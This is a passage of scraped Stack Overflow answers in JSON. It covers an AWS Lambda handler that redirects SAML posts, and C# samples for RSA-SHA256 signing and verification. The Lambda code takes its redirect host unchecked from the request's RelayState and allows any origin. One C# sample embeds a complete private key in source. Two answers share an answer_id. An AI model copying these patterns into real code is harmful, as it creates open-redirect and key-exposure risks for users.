        "body": "    def lambda_handler(event, context):\n        body = event.get('body')\n        redirect_host = body.split('RelayState=https%3A%2F%2F')[1].split('%2')[0]\n        # Here the request body is urlencoded and the URL will be of the form https://tenant1.myapp.com/ - we are only picking tenant1.myapp.com from the RelayState\n        redirect_url = 'https://' + redirect_host + '/saml/?acs'\n        # Our SAML redirection URL is of the form https://tenant1.myapp.com/saml/?acs\n        logger.info(f\"Redirecting To: {redirect_url}\")\n        return {\n            'statusCode': 307, # Status code 307 is to preserve the method by which this URL was called. Using 302 changes the method to GET whereas the SAML request comes as a POST\n            'headers': {\n                'Location': redirect_url,\n                'Content-Type': 'application/x-www-form-urlencoded',\n                'Access-Control-Allow-Origin': '*',\n            },\n            'body': body,\n        }",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-01-15T00:44:49",
        "author": "katiyarhrithik"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/65204140/c-code-needed-for-rsa-sha256-decryption-with-public-key",
    "title": "C# code needed for RSA-SHA256 decryption with public key",
    "question_id": 65204140,
    "posted_date": "2020-12-08T12:48:17",
    "answers": [
      {
        "answer_id": 65207614,
        "body": "using System;\nusing System.Text;\nusing System.Security.Cryptography;\npublic static class SHA256WithRSATest\n{\n\t/*\n\t\tPublic Key:\n\t\t\tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkH+X94XHM5RDyTNETNmt8vuu1Q5leSpb\n\t\t\tEMIru1WE/vte5Co8k9lluffhvGWeyZRCKH4kzIBHf5n/kKjftTvvT/mPwArnJFZXcRbT4ebZ66RE\n\t\t\thi/+uJkJbIQ2md43MJBjM6fSXZAUiNw8VP29yVhbVPV5UUIA2ddJfygk/4ZNOmxdgnEJdc3aJTsK\n\t\t\t99dEJ6BYqbcxA0Bk19Fv3/azV0jGZgrC4Y2hx3A+NvIYC05QYoqNkcfDExRVrKwduVWzqz6XDt7C\n\t\t\t9ERl5Ss2bsgm4gbDouJC+k+WoCcxkUO2tnxrsKxQtZetZZSvrkst/5ELBaJAvKpcq12CvnB09dY1\n\t\t\tMBV2XwIDAQAB\n\t\t\tConverted to an RSAParameters struct using Openssl:\n\t\t\techo MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkH+X94XHM5RDyTNETNmt8vuu1Q5leSpbEMIru1WE/vte5Co8k9lluffhvGWeyZRCKH4kzIBHf5n/kKjftTvvT/mPwArnJFZXcRbT4ebZ66REhi/+uJkJbIQ2md43MJBjM6fSXZAUiNw8VP29yVhbVPV5UUIA2ddJfygk/4ZNOmxdgnEJdc3aJTsK99dEJ6BYqbcxA0Bk19Fv3/azV0jGZgrC4Y2hx3A+NvIYC05QYoqNkcfDExRVrKwduVWzqz6XDt7C9ERl5Ss2bsgm4gbDouJC+k+WoCcxkUO2tnxrsKxQtZetZZSvrkst/5ELBaJAvKpcq12CvnB09dY1MBV2XwIDAQAB | base64 -d | openssl rsa -pubin -inform DER -noout -text\n\t\t\tRSA Public-Key: (2048 bit)\n\t\t\tModulus:\n\t\t\t    00:90:7f:97:f7:85:c7:33:94:43:c9:33:44:4c:d9:\n\t\t\t    ad:f2:fb:ae:d5:0e:65:79:2a:5b:10:c2:2b:bb:55:\n\t\t\t    84:fe:fb:5e:e4:2a:3c:93:d9:65:b9:f7:e1:bc:65:\n\t\t\t    9e:c9:94:42:28:7e:24:cc:80:47:7f:99:ff:90:a8:\n\t\t\t    df:b5:3b:ef:4f:f9:8f:c0:0a:e7:24:56:57:71:16:\n\t\t\t    d3:e1:e6:d9:eb:a4:44:86:2f:fe:b8:99:09:6c:84:\n\t\t\t    36:99:de:37:30:90:63:33:a7:d2:5d:90:14:88:dc:\n\t\t\t    3c:54:fd:bd:c9:58:5b:54:f5:79:51:42:00:d9:d7:\n\t\t\t    49:7f:28:24:ff:86:4d:3a:6c:5d:82:71:09:75:cd:\n\t\t\t    da:25:3b:0a:f7:d7:44:27:a0:58:a9:b7:31:03:40:\n\t\t\t    64:d7:d1:6f:df:f6:b3:57:48:c6:66:0a:c2:e1:8d:\n\t\t\t    a1:c7:70:3e:36:f2:18:0b:4e:50:62:8a:8d:91:c7:\n\t\t\t    c3:13:14:55:ac:ac:1d:b9:55:b3:ab:3e:97:0e:de:\n\t\t\t    c2:f4:44:65:e5:2b:36:6e:c8:26:e2:06:c3:a2:e2:\n\t\t\t    42:fa:4f:96:a0:27:31:91:43:b6:b6:7c:6b:b0:ac:\n\t\t\t    50:b5:97:ad:65:94:af:ae:4b:2d:ff:91:0b:05:a2:\n\t\t\t    40:bc:aa:5c:ab:5d:82:be:70:74:f5:d6:35:30:15:\n\t\t\t    76:5f\n\t\t\tExponent: 65537 (0x10001)\n\t*/\n\tprivate static readonly RSAParameters PUBLIC_KEY = new RSAParameters\n\t{\n\t\tModulus = new byte[]\n\t\t{\n\t\t\t0x90, 0x7f, 0x97, 0xf7, 0x85, 0xc7, 0x33, 0x94, 0x43, 0xc9,\n\t\t\t0x33, 0x44, 0x4c, 0xd9, 0xad, 0xf2, 0xfb, 0xae, 0xd5, 0x0e,\n\t\t\t0x65, 0x79, 0x2a, 0x5b, 0x10, 0xc2, 0x2b, 0xbb, 0x55, 0x84,\n\t\t\t0xfe, 0xfb, 0x5e, 0xe4, 0x2a, 0x3c, 0x93, 0xd9, 0x65, 0xb9,\n\t\t\t0xf7, 0xe1, 0xbc, 0x65, 0x9e, 0xc9, 0x94, 0x42, 0x28, 0x7e,\n\t\t\t0x24, 0xcc, 0x80, 0x47, 0x7f, 0x99, 0xff, 0x90, 0xa8, 0xdf,\n\t\t\t0xb5, 0x3b, 0xef, 0x4f, 0xf9, 0x8f, 0xc0, 0x0a, 0xe7, 0x24,\n\t\t\t0x56, 0x57, 0x71, 0x16, 0xd3, 0xe1, 0xe6, 0xd9, 0xeb, 0xa4,\n\t\t\t0x44, 0x86, 0x2f, 0xfe, 0xb8, 0x99, 0x09, 0x6c, 0x84, 0x36,\n\t\t\t0x99, 0xde, 0x37, 0x30, 0x90, 0x63, 0x33, 0xa7, 0xd2, 0x5d,\n\t\t\t0x90, 0x14, 0x88, 0xdc, 0x3c, 0x54, 0xfd, 0xbd, 0xc9, 0x58,\n\t\t\t0x5b, 0x54, 0xf5, 0x79, 0x51, 0x42, 0x00, 0xd9, 0xd7, 0x49,\n\t\t\t0x7f, 0x28, 0x24, 0xff, 0x86, 0x4d, 0x3a, 0x6c, 0x5d, 0x82,\n\t\t\t0x71, 0x09, 0x75, 0xcd, 0xda, 0x25, 0x3b, 0x0a, 0xf7, 0xd7,\n\t\t\t0x44, 0x27, 0xa0, 0x58, 0xa9, 0xb7, 0x31, 0x03, 0x40, 0x64,\n\t\t\t0xd7, 0xd1, 0x6f, 0xdf, 0xf6, 0xb3, 0x57, 0x48, 0xc6, 0x66,\n\t\t\t0x0a, 0xc2, 0xe1, 0x8d, 0xa1, 0xc7, 0x70, 0x3e, 0x36, 0xf2,\n\t\t\t0x18, 0x0b, 0x4e, 0x50, 0x62, 0x8a, 0x8d, 0x91, 0xc7, 0xc3,\n\t\t\t0x13, 0x14, 0x55, 0xac, 0xac, 0x1d, 0xb9, 0x55, 0xb3, 0xab,\n\t\t\t0x3e, 0x97, 0x0e, 0xde, 0xc2, 0xf4, 0x44, 0x65, 0xe5, 0x2b,\n\t\t\t0x36, 0x6e, 0xc8, 0x26, 0xe2, 0x06, 0xc3, 0xa2, 0xe2, 0x42,\n\t\t\t0xfa, 0x4f, 0x96, 0xa0, 0x27, 0x31, 0x91, 0x43, 0xb6, 0xb6,\n\t\t\t0x7c, 0x6b, 0xb0, 0xac, 0x50, 0xb5, 0x97, 0xad, 0x65, 0x94,\n\t\t\t0xaf, 0xae, 0x4b, 0x2d, 0xff, 0x91, 0x0b, 0x05, 0xa2, 0x40,\n\t\t\t0xbc, 0xaa, 0x5c, 0xab, 0x5d, 0x82, 0xbe, 0x70, 0x74, 0xf5,\n\t\t\t0xd6, 0x35, 0x30, 0x15, 0x76, 0x5f\n\t\t},\n\t\tExponent = new byte[] { 0x01,0x00,0x01 }\n\t};\n\tpublic static readonly byte[] theSignature =\n\t\tConvert.FromBase64String(\"UiBgtTc4hIYeZehhP8RWKvPIvWFXeh7ERFEvJr43v87YE7I4dqAHbD8l5DwZW3jezVfIcBflBS7ezjFDOH0/43T21ZCxwa/0qKhQRTjXoWQSETap5fXI9MCtWcGcP5iNmnBang7zfIsr+DBqQU5N3vlCBLORGqGVM0eMEv8nwBanAM2J7ZjbIVg7gou22eHau9751M4OoQM5FCo3nBTRepf2XA0K4W00TJg55chjMW/s91rw2ryJSPLUlrhvl5kWUYozGO56SzRjNhW+/HawcNZRa+OioWvlLp4bYi8mFyjlWWNAXqKPbqROQILhJnlHjGeMMq2qZTbd3t8aGHpeDg==\");\n\tpublic static readonly byte[] SHA256HASH =\n\t\tConvert.FromBase64String(\n\t\t\t\"47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=\");\n\tpublic static bool VerifyDigestSignature(\n\t\tbyte[] digest, byte[] digestSignature)\n\t{\n\t\tusing(RSACryptoServiceProvider rsaProvider =\n\t\t\t\tnew RSACryptoServiceProvider())\n\t\t{\n\t\t\trsaProvider.ImportParameters(PUBLIC_KEY);\n\t\t\treturn rsaProvider.VerifyHash(\n\t\t\t\tdigest, digestSignature, HashAlgorithmName.SHA256,\n\t\t\t\t\tRSASignaturePadding.Pkcs1);\n\t\t}\n\t}\n\tpublic static void Main(string[] args)\n\t{\n\t\tConsole.Error.WriteLine(\n\t\t\tVerifyDigestSignature(SHA256HASH,theSignature));\n\t}\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2020-12-08T17:05:30",
        "author": "lwg-ga"
      },
      {
        "answer_id": 65207614,
        "body": "using System;\nusing System.Text;\nusing System.Security.Cryptography;\npublic static class SHA256WithRSATest\n{\n\tprivate static readonly RSAParameters PUBLIC_KEY = new RSAParameters\n\t{\n\t\tModulus = new byte[]\n\t\t{\n\t\t\t0xc2, 0xdb, 0x06, 0xc3, 0xe0, 0x43, 0x3b, 0x38, 0x72,\n\t\t\t0x43, 0xc1, 0x87, 0xa4, 0x8b, 0x8c, 0x31, 0x64, 0x8a, 0xa4,\n\t\t\t0xf3, 0x0d, 0x96, 0xc9, 0x3c, 0x46, 0x5e, 0x16, 0x8a, 0x57,\n\t\t\t0xb6, 0x8c, 0x62, 0x0d, 0x3b, 0x78, 0x2f, 0xd8, 0x23, 0x6d,\n\t\t\t0x1a, 0x74, 0x0b, 0x1e, 0x7e, 0xd9, 0x44, 0xec, 0x74, 0x99,\n\t\t\t0xaf, 0x83, 0xe1, 0x84, 0x5c, 0x8b, 0x31, 0xac, 0x83, 0xe3,\n\t\t\t0x09, 0xc9, 0xff, 0xee, 0x29, 0xfd, 0xcd, 0x64, 0x34, 0x5b,\n\t\t\t0x25, 0xc7, 0xab, 0xf9, 0x76, 0x49, 0xcd, 0x1c, 0x53, 0xc4,\n\t\t\t0x82, 0xcb, 0x61, 0xfa, 0x87, 0xf5, 0xa7, 0xe4, 0x63, 0x03,\n\t\t\t0xbb, 0xbb, 0xb6, 0xc0, 0x2e, 0x5b, 0x1c, 0x28, 0xe6, 0xb8,\n\t\t\t0xba, 0x6e, 0x89, 0xf9, 0x5a, 0x15, 0xf7, 0x49, 0x63, 0x6b,\n\t\t\t0xb4, 0x90, 0x9c, 0xd5, 0xe8, 0xad, 0x5e, 0xa0, 0x95, 0x4b,\n\t\t\t0xf2, 0x9a, 0xaa, 0x29, 0x1e, 0x04, 0xfe, 0xc3, 0x8d, 0xea,\n\t\t\t0x41, 0xaf, 0xf8, 0x24, 0x7d, 0xf7, 0x3d, 0x24, 0x4d, 0xdd,\n\t\t\t0xcb, 0xad, 0x84, 0x94, 0xba, 0x32, 0xb8, 0x26, 0x3b, 0x48,\n\t\t\t0x55, 0xe2, 0x07, 0x13, 0x4d, 0x58, 0x1f, 0x61, 0x01, 0x92,\n\t\t\t0x40, 0x53, 0x23, 0x8f, 0x3d, 0x7d, 0x6a, 0x65, 0xe3, 0xb1,\n\t\t\t0xd3, 0xe3, 0x39, 0xd1, 0xd8, 0x77, 0xcd, 0x7d, 0x37, 0x9f,\n\t\t\t0x54, 0x76, 0x3f, 0xc3, 0x3f, 0x38, 0xe4, 0xab, 0xaf, 0x99,\n\t\t\t0x09, 0x1e, 0x96, 0x9d, 0x6e, 0x8e, 0x66, 0xb2, 0x5c, 0x39,\n\t\t\t0xee, 0xf7, 0x7e, 0x65, 0x89, 0x69, 0x9d, 0xdc, 0x20, 0xe7,\n\t\t\t0x63, 0x20, 0x75, 0x60, 0x75, 0x34, 0x22, 0x00, 0x2f, 0x74,\n\t\t\t0x5c, 0x4c, 0x0a, 0xdf, 0xb5, 0x12, 0xfa, 0x9d, 0xc1, 0xed,\n\t\t\t0x7f, 0x2e, 0xfc, 0xef, 0xd3, 0xb1, 0x62, 0x8a, 0xd7, 0x68,\n\t\t\t0x3c, 0xa6, 0x61, 0xa9, 0x3e, 0x9e, 0x27, 0x3c, 0x6e, 0x02,\n\t\t\t0xd1, 0x78, 0x0e, 0xe7, 0x8b, 0xb7, 0x91\n\t\t},\n\t\tExponent = new byte[] { 0x01,0x00,0x01 }\n\t};\n\tprivate static readonly RSAParameters PRIVATE_KEY = new RSAParameters\n\t{\n\t\tModulus = new byte[]\n\t\t{\n\t\t\t0xc2, 0xdb, 0x06, 0xc3, 0xe0, 0x43, 0x3b, 0x38, 0x72,\n\t\t\t0x43, 0xc1, 0x87, 0xa4, 0x8b, 0x8c, 0x31, 0x64, 0x8a, 0xa4,\n\t\t\t0xf3, 0x0d, 0x96, 0xc9, 0x3c, 0x46, 0x5e, 0x16, 0x8a, 0x57,\n\t\t\t0xb6, 0x8c, 0x62, 0x0d, 0x3b, 0x78, 0x2f, 0xd8, 0x23, 0x6d,\n\t\t\t0x1a, 0x74, 0x0b, 0x1e, 0x7e, 0xd9, 0x44, 0xec, 0x74, 0x99,\n\t\t\t0xaf, 0x83, 0xe1, 0x84, 0x5c, 0x8b, 0x31, 0xac, 0x83, 0xe3,\n\t\t\t0x09, 0xc9, 0xff, 0xee, 0x29, 0xfd, 0xcd, 0x64, 0x34, 0x5b,\n\t\t\t0x25, 0xc7, 0xab, 0xf9, 0x76, 0x49, 0xcd, 0x1c, 0x53, 0xc4,\n\t\t\t0x82, 0xcb, 0x61, 0xfa, 0x87, 0xf5, 0xa7, 0xe4, 0x63, 0x03,\n\t\t\t0xbb, 0xbb, 0xb6, 0xc0, 0x2e, 0x5b, 0x1c, 0x28, 0xe6, 0xb8,\n\t\t\t0xba, 0x6e, 0x89, 0xf9, 0x5a, 0x15, 0xf7, 0x49, 0x63, 0x6b,\n\t\t\t0xb4, 0x90, 0x9c, 0xd5, 0xe8, 0xad, 0x5e, 0xa0, 0x95, 0x4b,\n\t\t\t0xf2, 0x9a, 0xaa, 0x29, 0x1e, 0x04, 0xfe, 0xc3, 0x8d, 0xea,\n\t\t\t0x41, 0xaf, 0xf8, 0x24, 0x7d, 0xf7, 0x3d, 0x24, 0x4d, 0xdd,\n\t\t\t0xcb, 0xad, 0x84, 0x94, 0xba, 0x32, 0xb8, 0x26, 0x3b, 0x48,\n\t\t\t0x55, 0xe2, 0x07, 0x13, 0x4d, 0x58, 0x1f, 0x61, 0x01, 0x92,\n\t\t\t0x40, 0x53, 0x23, 0x8f, 0x3d, 0x7d, 0x6a, 0x65, 0xe3, 0xb1,\n\t\t\t0xd3, 0xe3, 0x39, 0xd1, 0xd8, 0x77, 0xcd, 0x7d, 0x37, 0x9f,\n\t\t\t0x54, 0x76, 0x3f, 0xc3, 0x3f, 0x38, 0xe4, 0xab, 0xaf, 0x99,\n\t\t\t0x09, 0x1e, 0x96, 0x9d, 0x6e, 0x8e, 0x66, 0xb2, 0x5c, 0x39,\n\t\t\t0xee, 0xf7, 0x7e, 0x65, 0x89, 0x69, 0x9d, 0xdc, 0x20, 0xe7,\n\t\t\t0x63, 0x20, 0x75, 0x60, 0x75, 0x34, 0x22, 0x00, 0x2f, 0x74,\n\t\t\t0x5c, 0x4c, 0x0a, 0xdf, 0xb5, 0x12, 0xfa, 0x9d, 0xc1, 0xed,\n\t\t\t0x7f, 0x2e, 0xfc, 0xef, 0xd3, 0xb1, 0x62, 0x8a, 0xd7, 0x68,\n\t\t\t0x3c, 0xa6, 0x61, 0xa9, 0x3e, 0x9e, 0x27, 0x3c, 0x6e, 0x02,\n\t\t\t0xd1, 0x78, 0x0e, 0xe7, 0x8b, 0xb7, 0x91\n\t\t},\n\t\tExponent = new byte[] { 0x01,0x00,0x01 },\n\t\tD = new byte[]\n\t\t{\n\t\t\t0x01, 0xe9, 0x6a, 0x38, 0x93, 0xc3, 0xb5, 0x1a, 0x09, 0xac,\n\t\t\t0xf6, 0x82, 0x21, 0x30, 0x29, 0x50, 0xf6, 0xbe, 0x91, 0x7d,\n\t\t\t0xbc, 0xfd, 0x64, 0xbe, 0x0d, 0xa6, 0xb0, 0xab, 0xec, 0xce,\n\t\t\t0x62, 0xb4, 0x37, 0x93, 0x04, 0xcb, 0xdb, 0x60, 0x05, 0x9b,\n\t\t\t0x03, 0xd6, 0x74, 0x17, 0x24, 0x84, 0x93, 0x99, 0x55, 0x44,\n\t\t\t0xae, 0x93, 0x90, 0xdb, 0xe3, 0x95, 0xba, 0x2e, 0x95, 0x14,\n\t\t\t0xac, 0x81, 0xb1, 0x51, 0x82, 0x26, 0xf8, 0xbb, 0xb6, 0xc5,\n\t\t\t0x39, 0x1f, 0x4b, 0xd4, 0x48, 0x47, 0x15, 0xe7, 0x10, 0x7f,\n\t\t\t0x84, 0x05, 0x53, 0x12, 0xf0, 0x6b, 0x14, 0x47, 0x90, 0x6a,\n\t\t\t0xd0, 0x1d, 0xab, 0xe7, 0x08, 0x87, 0xcf, 0x32, 0xec, 0x4f,\n\t\t\t0x0f, 0xf4, 0x94, 0x98, 0xb8, 0xac, 0x73, 0x70, 0xe1, 0x46,\n\t\t\t0xa5, 0x40, 0x94, 0xac, 0xb2, 0xbe, 0xc1, 0xee, 0x95, 0x0f,\n\t\t\t0x2d, 0x4b, 0x4c, 0x19, 0xfa, 0x4c, 0x91, 0x98, 0x97, 0x75,\n\t\t\t0x79, 0x6e, 0x02, 0x9d, 0xe7, 0x96, 0xe5, 0x71, 0x74, 0x67,\n\t\t\t0x6b, 0x80, 0xc1, 0x5c, 0x30, 0x28, 0x78, 0xe6, 0x31, 0xdd,\n\t\t\t0x09, 0x2d, 0x55, 0xd3, 0x1c, 0xbf, 0x12, 0x39, 0xe1, 0x3b,\n\t\t\t0xf0, 0xd0, 0x92, 0xa0, 0x8e, 0xe4, 0x69, 0x2f, 0xb4, 0xe0,\n\t\t\t0x7e, 0x6d, 0x62, 0x00, 0xd4, 0xf4, 0x80, 0x0a, 0x5e, 0xcf,\n\t\t\t0xf3, 0x16, 0x59, 0x15, 0x0f, 0x96, 0xb5, 0x3b, 0xcd, 0xb3,\n\t\t\t0x4d, 0x3b, 0x0f, 0x58, 0xc1, 0xaf, 0xde, 0x7d, 0x11, 0x6f,\n\t\t\t0x53, 0x37, 0x24, 0x29, 0x12, 0xc6, 0xeb, 0x2e, 0x11, 0x74,\n\t\t\t0x93, 0x66, 0xbd, 0x42, 0xc2, 0x28, 0x35, 0x32, 0x1f, 0xef,\n\t\t\t0x95, 0x6b, 0x92, 0xe9, 0x7f, 0x9e, 0xc5, 0xbf, 0xf1, 0xfc,\n\t\t\t0x48, 0x07, 0x2f, 0xda, 0xe0, 0x6b, 0xaa, 0xdd, 0x02, 0xc9,\n\t\t\t0x4f, 0xe4, 0xff, 0x56, 0xc5, 0xfb, 0xe7, 0x1e, 0x63, 0x47,\n\t\t\t0xa1, 0x0d, 0x44, 0x0e, 0x22, 0x1d\n\t\t},\n\t\tP = new byte[]\n\t\t{\n\t\t\t0xf1, 0x50, 0x52, 0x7e, 0x2b, 0xa7, 0xc3, 0x30, 0x26,\n\t\t\t0xda, 0x14, 0xaf, 0xf9, 0xc5, 0x21, 0x49, 0xab, 0xa8, 0x09,\n\t\t\t0x1f, 0x36, 0xe5, 0x1f, 0x0f, 0x52, 0x4d, 0x82, 0x41, 0x46,\n\t\t\t0x7e, 0x75, 0x43, 0x80, 0x8e, 0x58, 0x6f, 0xdf, 0x9d, 0xee,\n\t\t\t0x77, 0x4c, 0x9c, 0xff, 0x94, 0xf6, 0x90, 0xaa, 0xaf, 0x0f,\n\t\t\t0xba, 0xb6, 0x08, 0xe6, 0x3f, 0xaa, 0xf6, 0x37, 0xc5, 0xe3,\n\t\t\t0xf7, 0x6a, 0xcd, 0x1b, 0xb7, 0xa8, 0x78, 0x15, 0xfc, 0xd0,\n\t\t\t0xce, 0xe0, 0x67, 0xf5, 0xd7, 0xa2, 0xa7, 0x37, 0x6f, 0x95,\n\t\t\t0xeb, 0xe0, 0x13, 0x93, 0xc9, 0x65, 0xd8, 0x8b, 0x4e, 0x1c,\n\t\t\t0x46, 0xd8, 0x4f, 0x50, 0x6b, 0x02, 0x87, 0xb4, 0x4e, 0x55,\n\t\t\t0x6c, 0x21, 0xc3, 0xf5, 0xc7, 0xd9, 0x1d, 0x2a, 0xcd, 0x25,\n\t\t\t0x9a, 0xb4, 0x79, 0x28, 0x29, 0x03, 0x45, 0x11, 0x26, 0xce,\n\t\t\t0x76, 0x6c, 0xcb, 0x17, 0xb2, 0xc3, 0x58, 0x85, 0xe3\n\t\t},\n\t\tQ = new byte[]\n\t\t{\n\t\t\t0xce, 0xb6, 0xe2, 0x42, 0x9c, 0xe6, 0xd7, 0xc3, 0x52,\n\t\t\t0x83, 0x5f, 0xa7, 0x16, 0x04, 0x61, 0xf1, 0xb6, 0xf9, 0x65,\n\t\t\t0xb3, 0xda, 0x02, 0x10, 0x74, 0xc4, 0x67, 0x85, 0x5f, 0x1c,\n\t\t\t0x1f, 0xcb, 0x71, 0x0e, 0xe5, 0x10, 0x21, 0xd0, 0x5f, 0xbe,\n\t\t\t0xa4, 0x81, 0xcc, 0xdd, 0x52, 0xab, 0x6b, 0x40, 0x72, 0x09,\n\t\t\t0x9b, 0xa0, 0x4f, 0x2f, 0x88, 0x96, 0x54, 0xae, 0x66, 0x83,\n\t\t\t0xd5, 0x45, 0x48, 0xc7, 0x67, 0xaf, 0x5c, 0xc6, 0xfe, 0xb6,\n\t\t\t0x94, 0x26, 0x02, 0xf7, 0x1d, 0x41, 0x67, 0x98, 0x81, 0x1a,\n\t\t\t0x6a, 0xeb, 0xfb, 0x33, 0xc3, 0x34, 0x8a, 0x93, 0xbd, 0x74,\n\t\t\t0x4c, 0x7d, 0x1c, 0xc4, 0x38, 0x9d, 0x72, 0x6e, 0xe3, 0x79,\n\t\t\t0xd0, 0xec, 0xaf, 0xac, 0x14, 0xe2, 0xee, 0x27, 0x9c, 0x72,\n\t\t\t0xe6, 0xd8, 0x43, 0x6b, 0xc8, 0xae, 0x07, 0x5b, 0x5d, 0x27,\n\t\t\t0x61, 0xba, 0xa5, 0x7f, 0x74, 0xc8, 0x78, 0x66, 0xfb\n\t\t},\n\t\tDP = new byte[]\n\t\t{\n\t\t\t0x86, 0x46, 0x6e, 0x90, 0x9c, 0x54, 0x0e, 0x4d, 0x55,\n\t\t\t0xe1, 0x15, 0x8f, 0xd2, 0x08, 0xb9, 0xfc, 0x17, 0x53, 0x3a,\n\t\t\t0x38, 0x2f, 0x40, 0x90, 0xe6, 0xe2, 0xa2, 0x14, 0x6f, 0xa3,\n\t\t\t0xfd, 0x2b, 0xdc, 0xf2, 0xc4, 0xc2, 0x3b, 0x06, 0x10, 0x08,\n\t\t\t0x28, 0x43, 0xee, 0x3c, 0x5d, 0x34, 0x51, 0xcd, 0x57, 0xfa,\n\t\t\t0x05, 0xa7, 0xd3, 0x0d, 0xe3, 0xb1, 0x8a, 0xae, 0x00, 0x24,\n\t\t\t0x58, 0x81, 0x0a, 0x3e, 0x79, 0x14, 0x7a, 0x35, 0xa9, 0xe6,\n\t\t\t0xba, 0xa6, 0xad, 0xd2, 0x63, 0x39, 0xb3, 0x98, 0x2a, 0x34,\n\t\t\t0x1e, 0xfb, 0x21, 0x89, 0xa3, 0x90, 0x53, 0x4d, 0x38, 0x9a,\n\t\t\t0x8d, 0x65, 0x41, 0xc4, 0xfa, 0xb6, 0x7e, 0xb2, 0x7a, 0xc0,\n\t\t\t0x17, 0x9a, 0x36, 0x43, 0x26, 0x00, 0x0e, 0xb5, 0xc9, 0x4f,\n\t\t\t0x3a, 0x65, 0x5f, 0xe1, 0x53, 0xe8, 0xe8, 0xde, 0xa1, 0x5c,\n\t\t\t0x53, 0x13, 0x38, 0x73, 0x28, 0x5a, 0x80, 0x80, 0x87\n\t\t},\n\t\tDQ = new byte[]\n\t\t{\n\t\t\t0xc7, 0xe5, 0x24, 0x91, 0x84, 0x06, 0xdb, 0x19, 0x1f,\n\t\t\t0x9e, 0xb9, 0x0d, 0xeb, 0x85, 0x9b, 0x6d, 0x52, 0x22, 0x84,\n\t\t\t0x4d, 0xd2, 0x80, 0xf2, 0x86, 0xe8, 0x32, 0xaf, 0x4f, 0x94,\n\t\t\t0xf3, 0xce, 0x18, 0xeb, 0x6d, 0x69, 0x17, 0x39, 0xd8, 0x8c,\n\t\t\t0x93, 0xaa, 0x8d, 0x80, 0x6c, 0xe4, 0x25, 0x57, 0xf1, 0xaf,\n\t\t\t0x06, 0xd6, 0x94, 0x1c, 0x84, 0x39, 0xd3, 0x73, 0xbe, 0xe0,\n\t\t\t0xb7, 0x89, 0x43, 0x62, 0xc9, 0x0a, 0x54, 0x6e, 0x7e, 0x7b,\n\t\t\t0xf2, 0x71, 0x7b, 0xa6, 0x99, 0x9c, 0xd8, 0xe0, 0x29, 0xe0,\n\t\t\t0x71, 0x0a, 0xf8, 0x25, 0x4b, 0x1c, 0x70, 0xf1, 0x83, 0x60,\n\t\t\t0x86, 0x62, 0xea, 0x41, 0x79, 0xfa, 0x0f, 0x61, 0xda, 0x09,\n\t\t\t0xbf, 0x96, 0x52, 0x1e, 0xd7, 0x27, 0xc7, 0x63, 0x78, 0xaf,\n\t\t\t0xc8, 0x39, 0xd3, 0xa0, 0xd4, 0x34, 0x2e, 0x1b, 0x14, 0xce,\n\t\t\t0xf3, 0x7b, 0xb9, 0x74, 0xb2, 0x6a, 0xf5, 0xbb, 0xa7\n\t\t},\n\t\tInverseQ = new byte[]\n\t\t{\n\t\t\t0x83, 0x84, 0x1d, 0xa5, 0x91, 0x6a, 0xac, 0x17, 0xa3,\n\t\t\t0xaf, 0xb5, 0x1f, 0x36, 0x77, 0xcb, 0x9a, 0x05, 0x7a, 0x79,\n\t\t\t0xa3, 0x25, 0x77, 0xd9, 0x0e, 0x64, 0xdc, 0x18, 0xfd, 0xec,\n\t\t\t0xc6, 0xa4, 0xdc, 0x0f, 0x6a, 0x50, 0x91, 0x97, 0x12, 0xfe,\n\t\t\t0x05, 0x0b, 0xcd, 0x64, 0xf8, 0x6e, 0xbf, 0x12, 0x6b, 0xd2,\n\t\t\t0x0e, 0x7c, 0x94, 0xc2, 0x5b, 0x2d, 0x53, 0x0f, 0x45, 0x41,\n\t\t\t0xfb, 0x6b, 0x22, 0x64, 0xbb, 0x36, 0xc0, 0x24, 0x01, 0xe5,\n\t\t\t0x1b, 0xf7, 0x76, 0xa0, 0x3d, 0x67, 0x66, 0x2f, 0x6b, 0x80,\n\t\t\t0xb2, 0x35, 0x87, 0x68, 0xdb, 0x75, 0x4d, 0x3d, 0xc1, 0x21,\n\t\t\t0xa8, 0xff, 0x0d, 0xe7, 0xea, 0x2c, 0x87, 0xe1, 0xe5, 0xc1,\n\t\t\t0x81, 0x45, 0xd0, 0x2f, 0x6f, 0xbb, 0xe9, 0xbf, 0x1f, 0x93,\n\t\t\t0x62, 0x06, 0xf5, 0x2c, 0x78, 0xb0, 0x2a, 0x22, 0xb8, 0xeb,\n\t\t\t0xf8, 0xae, 0xdd, 0x1d, 0x25, 0x53, 0x66, 0xab, 0x94\n\t\t}\n\t};\n\tpublic const string SAMPLE_PAYLOAD =\n\t\t@\"{ 'name': 'value', 'name2' : 'value2' }\";\n\tpublic static byte[] GetDigest(byte[] message)\n\t{\n\t\tusing (SHA256 digestAlg = SHA256.Create())\n\t\t\treturn digestAlg.ComputeHash(message);\n\t}\n\tpublic static byte[] GetDigestSignature(byte[] digest)\n\t{\n\t\tusing(RSACryptoServiceProvider rsaProvider =\n\t\t\t\tnew RSACryptoServiceProvider())\n\t\t{\n\t\t\trsaProvider.ImportParameters(PRIVATE_KEY);\n\t\t\treturn rsaProvider.SignHash(digest, HashAlgorithmName.SHA256,\n\t\t\t\t\tRSASignaturePadding.Pkcs1);\n\t\t}\n\t}\n\tpublic static bool VerifyDigestSignature(\n\t\tbyte[] digest, byte[] digestSignature)\n\t{\n\t\tusing(RSACryptoServiceProvider rsaProvider =\n\t\t\t\tnew RSACryptoServiceProvider())\n\t\t{\n\t\t\trsaProvider.ImportParameters(PUBLIC_KEY);\n\t\t\treturn rsaProvider.VerifyHash(\n\t\t\t\tdigest, digestSignature, HashAlgorithmName.SHA256,\n\t\t\t\t\tRSASignaturePadding.Pkcs1);\n\t\t}\n\t}\n\tpublic static void Main(string[] args)\n\t{\n\t\tbyte[] dataForSignature = Encoding.UTF8.GetBytes(SAMPLE_PAYLOAD);\n\t\tbyte[] digest = GetDigest(dataForSignature);\n\t\tbyte[] hashSignature = GetDigestSignature(digest);\n\t\tConsole.WriteLine(\"The Sample Payload: {0}\", SAMPLE_PAYLOAD);\n\t\tConsole.WriteLine(\"SHA256 of Payload: 